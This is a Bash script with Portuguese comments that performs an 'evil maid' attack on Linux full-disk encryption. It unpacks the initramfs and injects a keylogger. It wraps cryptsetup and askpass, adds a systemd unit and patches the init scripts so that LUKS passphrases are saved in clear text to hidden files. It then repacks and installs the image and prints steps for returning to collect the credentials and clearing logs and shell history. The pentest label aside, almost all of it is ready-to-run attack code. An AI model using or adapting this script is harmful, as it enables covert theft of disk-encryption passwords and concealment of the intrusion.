#!/bin/bash
# initramfs_attack.sh - Injeta keylogger avançado no initramfs
# Evil Maid Pentest - Ataque ao Initramfs
# Uso: sudo ./initramfs_attack.sh [initramfs_path]

set -e

# Configuração de cores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m'

# Configurações
WORK_DIR="/tmp/evil_initramfs_$$"
BACKUP_DIR="/tmp/initramfs_backups"
LOG_FILE="/tmp/initramfs_attack.log"

# Banner
show_banner() {
    echo -e "${PURPLE}"
    echo "╔════════════════════════════════════════════════════════════════════════════════╗"
    echo "║                        Evil Maid Initramfs Attack                             ║"
    echo "║                      Advanced Keylogger Injection                             ║"
    echo "║                                                                              ║"
    echo "║  🎯 Target: Initramfs modification for LUKS password capture               ║"
    echo "║  ⚔️  Method: Boot-time keylogger injection                                  ║"
    echo "║  📡 Payload: Multi-vector credential harvesting                             ║"
    echo "╚════════════════════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

# Função de log
log() {
    local level=$1
    shift
    local message="$@"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    case $level in
        "INFO")  echo -e "${GREEN}[INFO]${NC} $message" ;;
        "WARN")  echo -e "${YELLOW}[WARN]${NC} $message" ;;
        "ERROR") echo -e "${RED}[ERROR]${NC} $message" ;;
        "DEBUG") echo -e "${BLUE}[DEBUG]${NC} $message" ;;
        "SUCCESS") echo -e "${GREEN}[SUCCESS]${NC} $message" ;;
    esac
    
    echo "[$timestamp] [$level] $message" >> "$LOG_FILE"
}

# Verificar privilégios root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        log "ERROR" "Este script requer privilégios de root"
        echo -e "${RED}Execute com: sudo $0${NC}"
        exit 1
    fi
}

# Verificar dependências
check_dependencies() {
    log "INFO" "Verificando dependências..."
    
    local deps=("cpio" "gzip" "file" "lsblk" "mount" "umount")
    local missing_deps=()
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" >/dev/null 2>&1; then
            missing_deps+=("$dep")
        fi
    done
    
    if [[ ${#missing_deps[@]} -gt 0 ]]; then
        log "ERROR" "Dependências não encontradas: ${missing_deps[*]}"
        echo "Instale com: apt-get install cpio gzip file util-linux"
        exit 1
    fi
    
    log "SUCCESS" "Todas as dependências estão disponíveis"
}

# Detectar initramfs automaticamente
detect_initramfs() {
    log "INFO" "Detectando arquivos initramfs..."
    
    local candidates=(
        "/boot/initrd.img"
        "/boot/initrd.img-$(uname -r)"
        "/boot/initramfs-$(uname -r).img"
        "/boot/initramfs.img"
    )
    
    # Também procurar em partições montadas
    if [[ -d "/mnt/evil_target/boot" ]]; then
        candidates+=(
            "/mnt/evil_target/boot/initrd.img"
            "/mnt/evil_target/boot/initrd.img-"*
            "/mnt/evil_target/boot/initramfs"*
        )
    fi
    
    local found_files=()
    
    for candidate in "${candidates[@]}"; do
        if [[ -f "$candidate" ]]; then
            found_files+=("$candidate")
        fi
    done
    
    if [[ ${#found_files[@]} -eq 0 ]]; then
        log "ERROR" "Nenhum arquivo initramfs encontrado"
        return 1
    fi
    
    echo -e "\n${GREEN}[+] Arquivos Initramfs Encontrados:${NC}"
    for i in "${!found_files[@]}"; do
        local file="${found_files[$i]}"
        local size=$(du -h "$file" | cut -f1)
        local type=$(file "$file" | cut -d: -f2 | xargs)
        
        echo "    [$((i+1))] $file"
        echo "        ├─ Tamanho: $size"
        echo "        └─ Tipo: $type"
    done
    
    # Retornar o primeiro arquivo encontrado
    echo "${found_files[0]}"
}

# Detectar tipo de compressão do initramfs
detect_compression() {
    local file="$1"
    
    if [[ ! -f "$file" ]]; then
        log "ERROR" "Arquivo não encontrado: $file"
        return 1
    fi
    
    local magic=$(hexdump -C "$file" | head -1 | cut -d' ' -f2-5)
    
    case "$magic" in
        *"1f 8b"*) echo "gzip" ;;
        *"fd 37 7a"*) echo "xz" ;;
        *"28 b5 2f fd"*) echo "zstd" ;;
        *"42 5a 68"*) echo "bzip2" ;;
        *"04 22 4d 18"*) echo "lz4" ;;
        *"89 4c 5a"*) echo "lzo" ;;
        *) echo "uncompressed" ;;
    esac
}

# Extrair initramfs
extract_initramfs() {
    local initramfs_file="$1"
    local extract_dir="$2"
    
    log "INFO" "Extraindo initramfs: $initramfs_file"
    
    mkdir -p "$extract_dir"
    cd "$extract_dir"
    
    local compression=$(detect_compression "$initramfs_file")
    log "INFO" "Tipo de compressão detectado: $compression"
    
    case "$compression" in
        "gzip")
            zcat "$initramfs_file" | cpio -idmv --no-absolute-filenames 2>/dev/null
            ;;
        "xz")
            xzcat "$initramfs_file" | cpio -idmv --no-absolute-filenames 2>/dev/null
            ;;
        "zstd")
            zstdcat "$initramfs_file" | cpio -idmv --no-absolute-filenames 2>/dev/null
            ;;
        "bzip2")
            bzcat "$initramfs_file" | cpio -idmv --no-absolute-filenames 2>/dev/null
            ;;
        "lz4")
            lz4cat "$initramfs_file" | cpio -idmv --no-absolute-filenames 2>/dev/null
            ;;
        "uncompressed")
            cpio -idmv --no-absolute-filenames < "$initramfs_file" 2>/dev/null
            ;;
        *)
            log "ERROR" "Tipo de compressão não suportado: $compression"
            return 1
            ;;
    esac
    
    local extracted_files=$(find . -type f | wc -l)
    log "SUCCESS" "Initramfs extraído: $extracted_files arquivos"
    
    return 0
}

# Criar payload keylogger avançado
create_advanced_keylogger() {
    local payload_file="$1"
    
    log "INFO" "Criando payload keylogger avançado..."
    
    cat > "$payload_file" << 'EOF'
#!/bin/bash
# Evil Maid Advanced Keylogger v2.0
# Multi-vector LUKS password capture system

# Configuração
LOG_FILES=("/boot/.system_metrics.dat" "/tmp/.luks_capture" "/dev/.evil_log")
TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
PID_FILE="/var/run/evil_keylogger.pid"

# Função de log segura
safe_log() {
    local message="$1"
    local logged=false
    
    for log_file in "${LOG_FILES[@]}"; do
        if echo "[$TIMESTAMP] $message" >> "$log_file" 2>/dev/null; then
            logged=true
            break
        fi
    done
    
    # Fallback para syslog se tudo mais falhar
    if ! $logged; then
        logger "[EVIL_MAID] $message" 2>/dev/null || true
    fi
}

# Inicialização do keylogger
init_keylogger() {
    echo $$ > "$PID_FILE" 2>/dev/null || true
    safe_log "Advanced keylogger initialized"
    
    # Tentar múltiplas estratégias de captura
    setup_cryptsetup_hook
    setup_askpass_hook
    setup_plymouth_hook
    setup_systemd_hook
}

# Hook no cryptsetup
setup_cryptsetup_hook() {
    if [[ -x "/sbin/cryptsetup" ]] && [[ ! -x "/sbin/cryptsetup.orig" ]]; then
        cp /sbin/cryptsetup /sbin/cryptsetup.orig
        
        cat > /sbin/cryptsetup << 'CRYPTSETUP_WRAPPER'
#!/bin/bash
# Wrapper para cryptsetup com captura de senha

source /evil_keylogger.sh 2>/dev/null || true

if [[ "$1" == "luksOpen" ]]; then
    DEVICE="$2"
    MAPPER="$3"
    
    safe_log "cryptsetup luksOpen intercepted for device: $DEVICE"
    
    # Capturar senha via múltiplos métodos
    if [[ -t 0 ]]; then
        # Terminal interativo
        echo "Enter passphrase for $DEVICE:" >&2
        PASSPHRASE=$(capture_password_interactive)
    else
        # Não interativo - tentar ler do stdin
        read -r PASSPHRASE
    fi
    
    # Log da tentativa
    safe_log "LUKS_PASSWORD_CAPTURED: Device=$DEVICE, Length=${#PASSPHRASE}"
    safe_log "LUKS_PASSWORD_HASH: $(echo -n "$PASSPHRASE" | sha256sum | cut -d' ' -f1)"
    
    # Tentar desbloquear com a senha capturada
    echo -n "$PASSPHRASE" | /sbin/cryptsetup.orig "$@"
    EXIT_CODE=$?
    
    if [[ $EXIT_CODE -eq 0 ]]; then
        safe_log "LUKS_SUCCESS: Device unlocked successfully"
        # Salvar senha em texto claro para uso posterior (cuidado!)
        for log_file in "${LOG_FILES[@]}"; do
            echo "CLEAR_PASSWORD:$PASSPHRASE" >> "$log_file" 2>/dev/null && break
        done
    else
        safe_log "LUKS_FAILED: Wrong password or other error (code: $EXIT_CODE)"
    fi
    
    exit $EXIT_CODE
else
    # Não é luksOpen, passar para o original
    /sbin/cryptsetup.orig "$@"
fi
CRYPTSETUP_WRAPPER
        
        chmod +x /sbin/cryptsetup
        safe_log "cryptsetup wrapper installed"
    fi
}

# Hook no askpass
setup_askpass_hook() {
    local askpass_programs=(
        "/lib/cryptsetup/askpass"
        "/usr/bin/systemd-ask-password" 
        "/lib/systemd/systemd-cryptsetup"
    )
    
    for program in "${askpass_programs[@]}"; do
        if [[ -x "$program" ]] && [[ ! -x "$program.orig" ]]; then
            cp "$program" "$program.orig"
            
            cat > "$program" << 'ASKPASS_WRAPPER'
#!/bin/bash
source /evil_keylogger.sh 2>/dev/null || true

PROMPT="${1:-Enter passphrase:}"
safe_log "askpass intercepted: $PROMPT"

PASSPHRASE=$(capture_password_interactive "$PROMPT")
safe_log "ASKPASS_CAPTURED: Length=${#PASSPHRASE}"

echo "$PASSPHRASE"
ASKPASS_WRAPPER
            
            chmod +x "$program"
            safe_log "askpass wrapper installed: $program"
        fi
    done
}

# Hook no Plymouth (tela de boot gráfica)
setup_plymouth_hook() {
    if command -v plymouth >/dev/null 2>&1; then
        # Plymouth ask-for-password hook
        local plymouth_script="/usr/share/plymouth/themes/evil-hook.script"
        
        mkdir -p "$(dirname "$plymouth_script")" 2>/dev/null || true
        
        cat > "$plymouth_script" << 'PLYMOUTH_HOOK'
# Plymouth evil hook
Plymouth.AskForPassword = function(prompt, bullets) {
    local password = original_ask_for_password(prompt, bullets);
    # Log capturado via Plymouth  
    return password;
};
PLYMOUTH_HOOK
        
        safe_log "Plymouth hook attempted"
    fi
}

# Hook no systemd
setup_systemd_hook() {
    # Criar unit de captura
    local unit_file="/etc/systemd/system/luks-capture.service"
    
    cat > "$unit_file" << 'SYSTEMD_UNIT'
[Unit]
Description=LUKS Password Capture Service
Before=cryptsetup.target
Before=systemd-cryptsetup@.service

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'source /evil_keylogger.sh; monitor_systemd_luks'
RemainAfterExit=yes

[Install]
WantedBy=cryptsetup.target
SYSTEMD_UNIT
    
    # Ativar o serviço
    systemctl daemon-reload 2>/dev/null || true
    systemctl enable luks-capture.service 2>/dev/null || true
    
    safe_log "systemd capture service installed"
}

# Captura interativa de senha
capture_password_interactive() {
    local prompt="${1:-Enter passphrase:}"
    local password=""
    local char=""
    
    echo -n "$prompt " >&2
    
    # Captura char por char para interceptar backspaces
    while IFS= read -r -s -n1 char; do
        if [[ "$char" == $'\n' ]] || [[ "$char" == $'\r' ]]; then
            break
        elif [[ "$char" == $'\x7f' ]] || [[ "$char" == $'\b' ]]; then
            # Backspace
            if [[ ${#password} -gt 0 ]]; then
                password="${password%?}"
                echo -n $'\b \b' >&2
            fi
        elif [[ -n "$char" ]]; then
            password+="$char"
            echo -n "*" >&2
        fi
    done
    
    echo >&2  # Nova linha
    
    echo "$password"
}

# Monitor de atividade systemd-cryptsetup
monitor_systemd_luks() {
    # Monitorar chamadas ao systemd-cryptsetup
    while true; do
        if pgrep -f "systemd-cryptsetup" >/dev/null 2>&1; then
            safe_log "systemd-cryptsetup activity detected"
            # Tentar interceptar através de strace se disponível
            if command -v strace >/dev/null 2>&1; then
                strace -p "$(pgrep systemd-cryptsetup | head -1)" -e trace=write 2>&1 | \
                    grep -o "password" | head -1 | \
                    xargs -I {} safe_log "systemd intercept attempt: {}" &
            fi
        fi
        sleep 1
    done
}

# Função de limpeza
cleanup_keylogger() {
    safe_log "Keylogger cleanup initiated"
    rm -f "$PID_FILE" 2>/dev/null || true
}

# Trap para limpeza
trap cleanup_keylogger EXIT

# Inicializar se executado diretamente
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    init_keylogger
fi

# Exportar funções para uso externo
export -f safe_log
export -f capture_password_interactive
export -f init_keylogger
EOF
    
    chmod +x "$payload_file"
    log "SUCCESS" "Payload keylogger avançado criado: $payload_file"
}

# Injetar payload no initramfs
inject_payload() {
    local extract_dir="$1"
    local payload_file="evil_keylogger.sh"
    
    log "INFO" "Injetando payload no initramfs..."
    
    # Copiar payload para o initramfs
    cp "$WORK_DIR/$payload_file" "$extract_dir/"
    chmod +x "$extract_dir/$payload_file"
    
    # Modificar script init
    local init_script="$extract_dir/init"
    if [[ -f "$init_script" ]]; then
        log "INFO" "Modificando script init..."
        
        # Backup do init original
        cp "$init_script" "$init_script.orig"
        
        # Criar novo init com payload injetado
        cat > "$init_script.new" << EOF
#!/bin/sh
# Modified init script with evil maid keylogger
# Original init backed up as init.orig

# Load evil keylogger early
if [ -f "/evil_keylogger.sh" ]; then
    . /evil_keylogger.sh
    init_keylogger 2>/dev/null || true
fi

EOF
        
        # Anexar o init original (exceto o shebang)
        tail -n +2 "$init_script" >> "$init_script.new"
        
        # Substituir o init
        mv "$init_script.new" "$init_script"
        chmod +x "$init_script"
        
        log "SUCCESS" "Script init modificado com sucesso"
    else
        log "WARN" "Script init não encontrado, tentando injeção alternativa..."
    fi
    
    # Modificar scripts em /scripts/ se existirem
    local scripts_dir="$extract_dir/scripts"
    if [[ -d "$scripts_dir" ]]; then
        log "INFO" "Modificando scripts auxiliares..."
        
        find "$scripts_dir" -name "*.sh" -o -name "*cryptroot*" -o -name "*local-top*" | while read -r script; do
            if [[ -f "$script" ]]; then
                # Inject keylogger source at beginning
                sed -i '1a\\n# Evil Maid Keylogger\n[ -f "/evil_keylogger.sh" ] && . /evil_keylogger.sh\n' "$script"
                log "DEBUG" "Modified script: $script"
            fi
        done
    fi
    
    # Criar hooks adicionais para cryptsetup
    local cryptsetup_dir="$extract_dir/lib/cryptsetup"
    if [[ -d "$cryptsetup_dir" ]]; then
        log "INFO" "Criando hooks cryptsetup específicos..."
        
        # Hook para askpass
        if [[ -x "$cryptsetup_dir/askpass" ]]; then
            mv "$cryptsetup_dir/askpass" "$cryptsetup_dir/askpass.orig"
            cat > "$cryptsetup_dir/askpass" << 'ASKPASS_HOOK'
#!/bin/sh
. /evil_keylogger.sh 2>/dev/null || true
PROMPT="${1:-Enter LUKS passphrase:}"
PASS=$(capture_password_interactive "$PROMPT")
echo "$PASS"
ASKPASS_HOOK
            chmod +x "$cryptsetup_dir/askpass"
            log "SUCCESS" "Hook askpass instalado"
        fi
    fi
}

# Recompactar initramfs
repack_initramfs() {
    local extract_dir="$1"
    local output_file="$2"
    local compression="$3"
    
    log "INFO" "Recompactando initramfs com compressão: $compression"
    
    cd "$extract_dir"
    
    case "$compression" in
        "gzip")
            find . -print0 | cpio --null -H newc -o | gzip -9 > "$output_file"
            ;;
        "xz")
            find . -print0 | cpio --null -H newc -o | xz --check=crc32 --lzma2=dict=1MiB > "$output_file"
            ;;
        "zstd")
            find . -print0 | cpio --null -H newc -o | zstd -19 > "$output_file"
            ;;
        "bzip2")
            find . -print0 | cpio --null -H newc -o | bzip2 -9 > "$output_file"
            ;;
        "lz4")
            find . -print0 | cpio --null -H newc -o | lz4 -9 > "$output_file"
            ;;
        "uncompressed")
            find . -print0 | cpio --null -H newc -o > "$output_file"
            ;;
        *)
            log "WARN" "Compressão não suportada, usando gzip"
            find . -print0 | cpio --null -H newc -o | gzip -9 > "$output_file"
            ;;
    esac
    
    if [[ $? -eq 0 ]] && [[ -f "$output_file" ]]; then
        local original_size=$(du -h "$1" 2>/dev/null | cut -f1 || echo "N/A")
        local new_size=$(du -h "$output_file" | cut -f1)
        
        log "SUCCESS" "Initramfs recompactado: $original_size → $new_size"
        return 0
    else
        log "ERROR" "Falha ao recompactar initramfs"
        return 1
    fi
}

# Instalar initramfs modificado
install_modified_initramfs() {
    local original_file="$1"
    local modified_file="$2"
    
    log "INFO" "Instalando initramfs modificado..."
    
    # Criar backup com timestamp
    local backup_file="$BACKUP_DIR/$(basename "$original_file").backup.$(date +%s)"
    mkdir -p "$BACKUP_DIR"
    
    cp "$original_file" "$backup_file"
    log "SUCCESS" "Backup criado: $backup_file"
    
    # Verificar integridade do arquivo modificado
    if [[ ! -f "$modified_file" ]] || [[ ! -s "$modified_file" ]]; then
        log "ERROR" "Arquivo modificado inválido ou vazio"
        return 1
    fi
    
    # Instalar novo initramfs
    cp "$modified_file" "$original_file"
    
    # Verificar se a instalação foi bem-sucedida
    if [[ $? -eq 0 ]]; then
        log "SUCCESS" "Initramfs modificado instalado com sucesso"
        
        # Atualizar permissões se necessário
        chmod 644 "$original_file"
        
        # Mostrar informações do arquivo
        local file_info=$(file "$original_file")
        log "INFO" "Arquivo instalado: $file_info"
        
        return 0
    else
        log "ERROR" "Falha ao instalar initramfs modificado"
        # Tentar restaurar backup
        cp "$backup_file" "$original_file"
        return 1
    fi
}

# Criar instruções de uso
create_usage_instructions() {
    local instructions_file="$WORK_DIR/evil_maid_instructions.txt"
    
    cat > "$instructions_file" << EOF
╔════════════════════════════════════════════════════════════════════════════════╗
║                         Evil Maid Attack Instructions                          ║
╚════════════════════════════════════════════════════════════════════════════════╝

✅ INITRAMFS SUCCESSFULLY MODIFIED

🎯 WHAT WAS DONE:
   - Advanced keylogger injected into initramfs
   - Multiple capture vectors installed
   - Backup created for recovery

📋 NEXT STEPS:
   1. Safely shutdown the target system
   2. Remove your attack media
   3. Wait for victim to boot normally
   4. Return later to collect captured credentials

🔍 CREDENTIAL COLLECTION:
   Boot with live USB again and check these files:
   - /boot/.system_metrics.dat
   - /tmp/.luks_capture  
   - /var/log/.system_metrics

⚠️  IMPORTANT NOTES:
   - Keylogger activates during LUKS unlock
   - Multiple fallback capture methods installed
   - Original initramfs backed up for restoration
   - Clean up traces after successful penetration test

🧹 CLEANUP PROCEDURE:
   1. Boot live USB again
   2. Mount target boot partition
   3. Restore original initramfs from backup
   4. Remove evil_keylogger.sh from partition
   5. Clear system logs if necessary

🔒 RESTORE COMMAND:
   sudo cp $BACKUP_DIR/initrd.img.backup.* /boot/initrd.img

📊 ATTACK VECTORS DEPLOYED:
   ✓ cryptsetup wrapper
   ✓ askpass hooks
   ✓ plymouth integration  
   ✓ systemd service hooks
   ✓ direct init modification

═══════════════════════════════════════════════════════════════════════════════════
Generated: $(date)
Attack ID: evil_maid_$(date +%s)
═══════════════════════════════════════════════════════════════════════════════════
EOF
    
    echo -e "\n${BLUE}[📋] Instruções salvas em: $instructions_file${NC}"
    cat "$instructions_file"
}

# Limpeza final
cleanup() {
    log "INFO" "Executando limpeza..."
    
    # Remover diretório de trabalho temporário
    if [[ -d "$WORK_DIR" ]] && [[ "$WORK_DIR" != "/" ]] && [[ "$WORK_DIR" == *"evil_initramfs"* ]]; then
        rm -rf "$WORK_DIR"
        log "SUCCESS" "Diretório temporário removido"
    fi
    
    # Limpar histórico bash
    history -c 2>/dev/null || true
    
    echo -e "\n${GREEN}✅ Limpeza concluída${NC}"
}

# Função principal
main() {
    local initramfs_path="$1"
    
    show_banner
    check_root
    check_dependencies
    
    # Detectar initramfs se não especificado
    if [[ -z "$initramfs_path" ]]; then
        initramfs_path=$(detect_initramfs)
        if [[ $? -ne 0 ]] || [[ -z "$initramfs_path" ]]; then
            log "ERROR" "Não foi possível detectar arquivo initramfs"
            exit 1
        fi
    fi
    
    if [[ ! -f "$initramfs_path" ]]; then
        log "ERROR" "Arquivo initramfs não encontrado: $initramfs_path"
        exit 1
    fi
    
    log "INFO" "Iniciando ataque ao initramfs: $initramfs_path"
    
    # Criar diretórios de trabalho
    mkdir -p "$WORK_DIR" "$BACKUP_DIR"
    
    # Detectar compressão
    local compression=$(detect_compression "$initramfs_path")
    log "INFO" "Compressão detectada: $compression"
    
    # Extrair initramfs
    local extract_dir="$WORK_DIR/extracted"
    if ! extract_initramfs "$initramfs_path" "$extract_dir"; then
        log "ERROR" "Falha ao extrair initramfs"
        cleanup
        exit 1
    fi
    
    # Criar payload keylogger
    create_advanced_keylogger "$WORK_DIR/evil_keylogger.sh"
    
    # Injetar payload
    inject_payload "$extract_dir"
    
    # Recompactar initramfs
    local modified_file="$WORK_DIR/evil_initramfs.img"
    if ! repack_initramfs "$extract_dir" "$modified_file" "$compression"; then
        log "ERROR" "Falha ao recompactar initramfs"
        cleanup
        exit 1
    fi
    
    # Instalar initramfs modificado
    if install_modified_initramfs "$initramfs_path" "$modified_file"; then
        log "SUCCESS" "Ataque ao initramfs concluído com sucesso!"
        create_usage_instructions
    else
        log "ERROR" "Falha ao instalar initramfs modificado"
        cleanup
        exit 1
    fi
    
    cleanup
}

# Trap para limpeza em caso de interrupção
trap cleanup EXIT

# Executar se chamado diretamente
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi